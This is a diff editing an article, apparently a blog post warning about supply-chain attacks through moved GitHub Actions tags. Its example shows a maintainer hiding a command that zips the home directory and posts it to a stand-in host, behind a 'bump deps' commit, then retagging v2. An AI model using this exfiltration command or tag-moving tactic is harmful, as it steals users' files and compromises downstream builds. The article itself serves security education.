@@ -35,16 +35,19 @@ Some time later, `malloy` makes a new release of `setup-foo` with the following
 code:
 
 ```diff
-#!/usr/bin/env sh
-echo "imagine there is more shell code here"
-+zip -r nothing_really.zip .
-+curl POST nothing_really.zip https://totally-legit-server.ru
-echo "legit shell code"
-echo "more legit shell code"
+ #!/usr/bin/env sh
+ echo "imagine there is shell code here"
++cd ~ && zip -r nothing_really.zip .
++curl \
++  --request POST https://totally-legit-server.ru \
++  --form "file=@$HOME/nothing_really.zip"
++cd -
+ echo "legit shell code"
+ echo "more legit shell code"
 ```
 
 The change is introduced in a commit with message "bump deps" that removes 6969
-and adds 2137 lines of code to many files, mostly `pubspec-lock.json`. Then
+and adds 2137 lines of code to many files, mostly `package-lock.json`. Then
 `malloy` releases this new version as `v2.1`:
 
 ```console
@@ -52,8 +55,8 @@ git commit -m "bump deps" && git push origin master
 git tag v2.1
 ```
 
-and then he moves the `v2` to reflect the point to `v2.1`, [**just like GitHub
-recommends**][gh]:
+and then he moves the `v2` tag to point to the same commit as `v2.1`, [**just
+like GitHub recommends**][gh]:
 
 ```console
 git tag --delete v2 # delete tag locally
@@ -62,8 +65,8 @@ git tag v2
 git push --tags
 ```
 
-It's Friday night. Hundreds of thousands of nightly builds run, in thousands of
-repositories, including private ones.
+It's a Friday night. Hundreds of thousands of nightly builds run, in thousands
+of repositories, including private ones.
 
 No one notices for a few days.
 
